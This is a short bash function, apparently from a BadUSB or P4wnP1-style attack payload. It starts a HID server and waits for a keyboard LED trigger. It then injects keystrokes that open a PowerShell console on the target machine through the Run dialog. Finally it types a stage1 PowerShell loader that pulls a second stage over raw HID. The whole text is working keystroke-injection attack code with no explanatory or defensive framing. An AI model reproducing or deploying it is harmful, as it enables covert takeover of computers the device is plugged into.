function onKeyboardUp()
{
	# start HID Server
	screen -dmS hidsrv bash -c "cd $wdir/hidtools/; python hidsrv9.py"

	while $true; do
		# wait for keyboard LED trigger
		key_trigger
	
		# run interactive PowerShell console
		cat <<- EOF | duckhid
			GUI r
			DELAY 500
			STRING powershell.exe
			ENTER
			DELAY 1000
EOF

		# output stage1 command (loads stage2 via raw HID)
		cat $wdir/hidtools/stage1_mini.ps1 | outhid
	done
}
